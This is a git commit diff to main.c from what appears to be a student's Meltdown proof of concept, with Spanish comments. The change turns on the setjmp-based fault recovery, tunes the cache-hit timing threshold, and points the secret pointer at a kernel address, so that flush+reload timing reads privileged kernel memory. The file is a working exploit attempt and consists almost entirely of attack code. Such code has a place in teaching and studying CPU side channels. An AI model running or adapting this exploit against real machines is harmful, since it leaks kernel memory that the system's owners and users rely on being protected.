9f30a18431c6dc19329a08aab7ed7b55b6999097
jesusangel <94452268+JesusAngelEHU@users.noreply.github.com>
2025-05-19 00:00:25 +0200

    Update main.c

--- main.c
+++ main.c
@@ -8,11 +8,12 @@
 #include <x86intrin.h>
 #include <string.h>
 
-#define CACHE_HIT_THRESHOLD 900
+#define CACHE_HIT_THRESHOLD 800
 #define NUM_TRIALS 500
 static jmp_buf env;
 uint8_t leaked_value = 0;
 
+//Desbloquea la señal
 static void unblock_signal(int signum __attribute__((__unused__))) {
   sigset_t sigs;
   sigemptyset(&sigs);
@@ -20,12 +21,14 @@ static void unblock_signal(int signum __attribute__((__unused__))) {
   sigprocmask(SIG_UNBLOCK, &sigs, NULL);
 }
 
+//Sigue con la ejecucion normal del programa
 static void segfault_handler(int signum) {
   (void)signum;
   unblock_signal(SIGSEGV);
   longjmp(env, 1);
 }
 
+//Codigo del ataque meltdown+flush&reload
 void meltdown_attack(uint8_t *address, uint8_t *probe_array) {
     int i; 
     //Flush probe_array from cache
@@ -34,17 +37,18 @@ void meltdown_attack(uint8_t *address, uint8_t *probe_array) {
     }
     _mm_mfence(); // Memory fence to enforce ordering
     // Try to read secret
-    //if (setjmp(env) == 0) { // Save execution context
+    if (setjmp(env) == 0) { // Save execution context
         uint8_t value = *address; // Illegal access ( causes fault )
         uint8_t offset = value * 4096; // Multiply value by 4096
         volatile uint8_t temp = probe_array[offset];  // Access based on value
-    //}
+    }
     // After fault , recover which page is cached
     for (i = 0; i < 256; i++) {
         unsigned int aux;
         uint64_t t1 = __rdtscp(&aux);
         volatile uint8_t dummy = probe_array[i * 4096];
         uint64_t t2 = __rdtscp(&aux) - t1;
+        //printf("i:%i t2:%d\n",i,t2);
         if (t2 < CACHE_HIT_THRESHOLD && i>=1) {
             leaked_value = (uint8_t)i;
             return;
@@ -56,7 +60,8 @@ int main() {
 
     //tabla con resultados del ataque
     uint8_t results[256]={0};
-    uint8_t secret[1]="H";
+    //Direccion del kernel
+    uint8_t *secret = (uint8_t *)0xffffffffff000000;
 
     // Probe array inicializado a 0
     uint8_t probe_array[256 * 4096];
@@ -74,17 +79,14 @@ int main() {
     int max_count = 0;
     uint8_t max_val = 0;
     for (int i = 0; i < 255; i++) {
-        printf("i:%c count:%d\n",i,results[i]);
+        //printf("i:%c count:%d\n",i,results[i]);
         if (results[i] > max_count) {
             max_count = results[i];
             max_val = i;
         }
     }
-    //printf("%i \n",max_val);
-
-    // Restaurar permisos para liberar memoria limpia
-    // mprotect(secret, pagesize, PROT_READ | PROT_WRITE);
-    // munmap(secret, pagesize);
+    printf("%i \n",max_val);
 
     return 0;
 }
+
